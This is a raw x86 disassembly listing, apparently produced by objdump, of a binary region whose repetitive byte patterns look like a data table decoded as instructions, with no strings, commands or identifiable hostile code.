  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 7b 24 0a    	add    %dl,0xa247b00(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 23 1b 84    	add    %dl,-0x7be4dd00(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 0b 02 89    	add    %dl,-0x76fdf500(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 11 01 0a    	add    %dl,0xa011100(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 29                	add    %ch,(%ecx)
  40637f:	05 94 00 10 00       	add    $0x100094,%eax
  406384:	24 2f                	and    $0x2f,%al
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 62 01             	add    %ah,0x1(%edx)
  40638e:	58                   	pop    %eax
  40638f:	00 11                	add    %dl,(%ecx)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 5c 05 9a    	add    %dl,-0x65faa400(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 da 01 9a    	add    %dl,-0x65fe2600(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 14 1e 0a    	add    %dl,0xa1e1418(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 4b 1b             	add    %cl,0x1b(%ebx)
  4063c6:	0a 00                	or     (%eax),%al
  4063c8:	14 00                	adc    $0x0,%al
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	0e                   	push   %cs
  4063d3:	1e                   	push   %ds
  4063d4:	0e                   	push   %cs
  4063d5:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 7d 15 0a    	add    %dl,0xa157d00(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 38 06 1d    	add    %dl,0x1d063800(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 5c 17 1d    	add    %dl,0x1d175c00(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 a5 1e 1d    	add    %dl,0x1d1ea500(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 1e                	add    %bl,(%esi)
  406419:	25 1d 00 14 00       	and    $0x14001d,%eax
  40641e:	20 36                	and    %dh,(%esi)
  406420:	00 00                	add    %al,(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 a5 24 1d 00 14    	add    %ah,0x14001d24(%ebp)
  40642b:	00 78 20             	add    %bh,0x20(%eax)
  40642e:	00 00                	add    %al,(%eax)
  406430:	00 00                	add    %al,(%eax)
  406432:	86 18                	xchg   %bl,(%eax)
  406434:	0e                   	push   %cs
  406435:	1e                   	push   %ds
  406436:	0e                   	push   %cs
  406437:	00 14 00             	add    %dl,(%eax,%eax,1)
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 37                	add    %dh,(%edi)
  406443:	01 c3                	add    %eax,%ebx
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 57 26             	add    %dl,0x26(%edi)
  406452:	c7 00 14 00 5c 37    	movl   $0x375c0014,(%eax)
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 f3                	add    %dh,%bl
  40645f:	02 53 00             	add    0x0(%ebx),%dl
  406462:	15 00 7b 21 00       	adc    $0x217b00,%eax
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 60 24 1d    	add    %dl,0x1d246000(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 67 03 0a    	add    %dl,0xa036700(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 b3 01 c3    	add    %dl,-0x3cfe4d00(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 41 05 d5    	add    %dl,-0x2afabf00(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 61 16 0a    	add    %dl,0xa166100(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 2a 19 c3    	add    %dl,-0x3ce6d600(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 5a 25 1d    	add    %dl,0x1d255a00(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 b4 16 0a    	add    %dl,0xa16b400(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 d9    	add    %al,-0x26df6a00(%eax)
  4064dd:	15 e0 00 16 00       	adc    $0x1600e0,%eax
  4064e2:	00 00                	add    %al,(%eax)
  4064e4:	00 00                	add    %al,(%eax)
  4064e6:	80 00 96             	addb   $0x96,(%eax)
  4064e9:	20 6d 24             	and    %ch,0x24(%ebp)
  4064ec:	e4 00                	in     $0x0,%al
  4064ee:	16                   	push   %ss
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 93    	add    %al,-0x6cdf6a00(%eax)
  4064f9:	05 ec 00 19 00       	add    $0x1900ec,%eax
  4064fe:	00 00                	add    %al,(%eax)
  406500:	00 00                	add    %al,(%eax)
  406502:	80 00 96             	addb   $0x96,(%eax)
  406505:	20 fa                	and    %bh,%dl
  406507:	1a f1                	sbb    %cl,%dh
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 bf    	add    %al,-0x40df6a00(%eax)
  406515:	14 f8                	adc    $0xf8,%al
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 09                	and    %cl,(%ecx)
  406523:	19 ff                	sbb    %edi,%edi
  406525:	00 1d 00 ad 21 00    	add    %bl,0x21ad00
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 d5 02 1c    	add    %dl,0x1c02d500(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 05 01 0a    	add    %dl,0xa010500(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 b0 02 0a 00 22    	add    %dh,0x22000a02(%eax)
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 fe 0a 23    	add    %dl,0x230afe00(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 7b 16             	add    %bh,0x16(%ebx)
  40656a:	2a 01                	sub    (%ecx),%al
  40656c:	24 00                	and    $0x0,%al
  40656e:	cc                   	int3
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 03 21 84    	add    %dl,-0x7bdefd00(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 7f 1e 1d    	add    %dl,0x1d1e7f00(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 14 1e 0a    	add    %dl,0xa1e1418(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 c8 02 9a    	add    %dl,-0x65fd3800(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 f7                	add    %dh,%bh
  4065af:	24 38                	and    $0x38,%al
  4065b1:	01 27                	add    %esp,(%edi)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 a9 07 0a    	add    %dl,0xa07a900(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 28 06 3e    	add    %dl,0x3e062800(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 14 1e             	sbb    %dl,(%esi,%ebx,1)
  4065da:	0a 00                	or     (%eax),%al
  4065dc:	29 00                	sub    %eax,(%eax)
  4065de:	f4                   	hlt
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	0e                   	push   %cs
  4065e7:	1e                   	push   %ds
  4065e8:	6b 01 29             	imul   $0x29,(%ecx),%eax
  4065eb:	00 56 22             	add    %dl,0x22(%esi)
  4065ee:	00 00                	add    %al,(%eax)
  4065f0:	00 00                	add    %al,(%eax)
  4065f2:	86 00                	xchg   %al,(%eax)
  4065f4:	3d 04 70 01 2a       	cmp    $0x2a017004,%eax
  4065f9:	00 6c 41 00          	add    %ch,0x0(%ecx,%eax,2)
  4065fd:	00 00                	add    %al,(%eax)
  4065ff:	00 86 00 d8 12 75    	add    %al,0x7512d800(%esi)
  406605:	01 2b                	add    %ebp,(%ebx)
  406607:	00 6e 22             	add    %ch,0x22(%esi)
  40660a:	00 00                	add    %al,(%eax)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	86 00                	xchg   %al,(%eax)
  406610:	ba 03 70 01 2c       	mov    $0x2c017003,%edx
  406615:	00 c4                	add    %al,%ah
  406617:	42                   	inc    %edx
  406618:	00 00                	add    %al,(%eax)
  40661a:	00 00                	add    %al,(%eax)
  40661c:	86 00                	xchg   %al,(%eax)
  40661e:	ec                   	in     (%dx),%al
  40661f:	24 75                	and    $0x75,%al
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 f0 06 7c 01    	addl   $0x17c06f0,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 14 1e 0a    	add    %dl,0xa1e1418(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 26                	add    %ah,(%esi)
  406649:	0a c7                	or     %bh,%al
  40664b:	00 30                	add    %dh,(%eax)
  40664d:	00 40 45             	add    %al,0x45(%eax)
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 6f 01             	add    %ch,0x1(%edi)
  406658:	84 01                	test   %al,(%ecx)
  40665a:	31 00                	xor    %eax,(%eax)
  40665c:	9f                   	lahf
  40665d:	22 00                	and    (%eax),%al
  40665f:	00 00                	add    %al,(%eax)
  406661:	00 96 00 fd 06 2a    	add    %dl,0x2a06fd00(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 d3                	add    %dl,%bl
  406673:	00 93 01 33 00 80    	add    %dl,-0x7fffccff(%ebx)
  406679:	45                   	inc    %ebp
  40667a:	00 00                	add    %al,(%eax)
  40667c:	00 00                	add    %al,(%eax)
  40667e:	96                   	xchg   %eax,%esi
  40667f:	00 ab 18 93 01 34    	add    %ch,0x34019318(%ebx)
  406685:	00 c8                	add    %cl,%al
  406687:	45                   	inc    %ebp
  406688:	00 00                	add    %al,(%eax)
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 7d 09             	add    %bh,0x9(%ebp)
  406690:	93                   	xchg   %eax,%ebx
  406691:	01 35 00 10 46 00    	add    %esi,0x461000
  406697:	00 00                	add    %al,(%eax)
  406699:	00 96 00 d0 16 84    	add    %dl,-0x7be93000(%esi)
  40669f:	01 36                	add    %esi,(%esi)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 07 1b 99    	add    %dl,-0x66e4f900(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 35 0b 9f    	add    %dl,-0x60f4cb00(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 40 03 a5    	add    %dl,-0x5afcc000(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 3e 1b ab    	add    %dl,-0x54e4c200(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	0e                   	push   %cs
  4066e3:	1e                   	push   %ds
  4066e4:	0e                   	push   %cs
  4066e5:	00 3b                	add    %bh,(%ebx)
  4066e7:	00 0b                	add    %cl,(%ebx)
  4066e9:	23 00                	and    (%eax),%eax
  4066eb:	00 00                	add    %al,(%eax)
  4066ed:	00 91 18 14 1e 0a    	add    %dl,0xa1e1418(%ecx)
  4066f3:	00 3b                	add    %bh,(%ebx)
  4066f5:	00 17                	add    %dl,(%edi)
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 0e 1e b1    	add    %al,-0x4ee1f1e8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 ba 22 bb 01 3c    	or     %edi,0x3c01bb22(%edx)
  406711:	00 40 23             	add    %al,0x23(%eax)
  406714:	00 00                	add    %al,(%eax)
  406716:	00 00                	add    %al,(%eax)
  406718:	e1 01                	loope  0x40671b
  40671a:	c0 23 bf             	shlb   $0xbf,(%ebx)
  40671d:	01 3c 00             	add    %edi,(%eax,%eax,1)
  406720:	63 23                	arpl   %esp,(%ebx)
  406722:	00 00                	add    %al,(%eax)
  406724:	00 00                	add    %al,(%eax)
  406726:	e1 01                	loope  0x406729
  406728:	e1 21                	loope  0x40674b
  40672a:	0e                   	push   %cs
  40672b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40672e:	6c                   	insb   (%dx),%es:(%edi)
  40672f:	23 00                	and    (%eax),%eax
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 0e 1e cb    	add    %al,-0x34e1f1e8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 e6 08 d7    	add    %al,-0x28f71a00(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 e9 07 dc    	add    %al,-0x23f81700(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 16 20 e2    	add    %al,-0x1ddfea00(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 32 0a e8    	add    %al,-0x17f5ce00(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 78 18 ee    	add    %al,-0x11e787f8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	2a 15 f4 01 42 00    	sub    0x4201f4,%dl
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 9a 1e 6b 01    	addl   $0x16b1e9a,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 ab 04 0e 00    	addl   $0xe04ab,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 b0 05 d7 01    	addl   $0x1d705b0,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 98 09 0a 02    	addl   $0x20a0998,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	e1 17                	loope  0x4067e9
  4067d2:	dc 01                	faddl  (%ecx)
  4067d4:	44                   	inc    %esp
  4067d5:	00 00                	add    %al,(%eax)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 19 0b d7    	add    %al,-0x28f4e700(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 f6 00 d7    	add    %al,-0x28ff0a00(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 86 02 d7    	add    %al,-0x28fd7a00(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 cb 12 0f 02    	addl   $0x20f12cb,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 a6 01 0f 02    	addl   $0x20f01a6,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	3e 0a 15 02 47 00 5f 	or     %ds:0x5f004702,%dl
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 a3 05 1a    	add    %al,0x1a05a300(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 bd 02 1f    	add    %al,0x1f02bd00(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	74 1b                	je     0x40686b
  406850:	23 02                	and    (%edx),%eax
  406852:	49                   	dec    %ecx
  406853:	00 28                	add    %ch,(%eax)
  406855:	4a                   	dec    %edx
  406856:	00 00                	add    %al,(%eax)
  406858:	00 00                	add    %al,(%eax)
  40685a:	86 00                	xchg   %al,(%eax)
  40685c:	88 01                	mov    %al,(%ecx)
  40685e:	27                   	daa
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	64 08 2b             	or     %ch,%fs:(%ebx)
  40686d:	02 49 00             	add    0x0(%ecx),%cl
  406870:	bc 4a 00 00 00       	mov    $0x4a,%esp
  406875:	00 86 00 8d 07 31    	add    %al,0x31078d00(%esi)
  40687b:	02 4a 00             	add    0x0(%edx),%cl
  40687e:	85 24 00             	test   %esp,(%eax,%eax,1)
  406881:	00 00                	add    %al,(%eax)
  406883:	00 86 00 94 02 36    	add    %al,0x36029400(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 14 04             	add    %dl,(%esp,%eax,1)
  406896:	3c 02                	cmp    $0x2,%al
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 be 12 42    	add    %al,0x4212be00(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 8d 08 42    	add    %al,0x42088d00(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	e2 09                	loop   0x4068c9
  4068c0:	dc 01                	faddl  (%ecx)
  4068c2:	50                   	push   %eax
  4068c3:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068c9:	00 86 00 bd 17 0e    	add    %al,0xe17bd00(%esi)
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 a5 0a 6b    	add    %al,0x6b0aa500(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 18 07 47    	add    %al,0x47071800(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 2e 13 4b    	add    %al,0x4b132e00(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	ac                   	lods   %ds:(%esi),%al
  406905:	03 50 02             	add    0x2(%eax),%edx
  406908:	53                   	push   %ebx
  406909:	00 1f                	add    %bl,(%edi)
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	2c 1c                	sub    $0x1c,%al
  406914:	55                   	push   %ebp
  406915:	02 54 00 cc          	add    -0x34(%eax,%eax,1),%dl
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	2c 24                	sub    $0x24,%al
  406922:	2b 02                	sub    (%edx),%eax
  406924:	55                   	push   %ebp
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	06                   	push   %es
  40692f:	04 6b                	add    $0x6b,%al
  406931:	01 56 00             	add    %edx,0x0(%esi)
  406934:	48                   	dec    %eax
  406935:	4d                   	dec    %ebp
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	24 18                	and    $0x18,%al
  40693e:	0f 02 57 00          	lar    0x0(%edi),%edx
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	9e                   	sahf
  40694b:	15 31 02 58 00       	adc    $0x580231,%eax
  406950:	c8 53 00 00          	enter  $0x53,$0x0
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	1d 01 0f 02 58       	sbb    $0x58020f01,%eax
  40695d:	00 34 25 00 00 00 00 	add    %dh,0x0(,%eiz,1)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	33 14 47             	xor    (%edi,%eax,2),%edx
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	40                   	inc    %eax
  406975:	14 6b                	adc    $0x6b,%al
  406977:	01 59 00             	add    %ebx,0x0(%ecx)
  40697a:	45                   	inc    %ebp
  40697b:	25 00 00 00 00       	and    $0x0,%eax
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	f9                   	stc
  406983:	1c 23                	sbb    $0x23,%al
  406985:	02 5a 00             	add    0x0(%edx),%bl
  406988:	4d                   	dec    %ebp
  406989:	25 00 00 00 00       	and    $0x0,%eax
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	07                   	pop    %es
  406991:	1d 15 02 5a 00       	sbb    $0x5a0215,%eax
  406996:	56                   	push   %esi
  406997:	25 00 00 00 00       	and    $0x0,%eax
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	77 21                	ja     0x4069c1
  4069a0:	27                   	daa
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
